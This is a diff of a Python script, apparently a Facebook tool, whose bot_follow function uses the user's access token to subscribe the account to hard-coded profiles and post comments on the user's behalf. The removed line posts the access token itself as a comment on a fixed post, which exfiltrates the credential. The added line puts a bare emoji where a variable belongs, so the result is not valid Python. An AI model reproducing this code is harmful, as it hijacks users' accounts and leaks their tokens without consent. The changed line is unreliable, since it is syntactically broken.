@@ -211,7 +211,7 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + toket)     
 	requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + toket)    
 	requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token=" + toket) 
-	requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' +toket+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' +😊+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/953529338576547/comments/?message=' +kom+ '&access_token=' + toket)
 	menu()
 
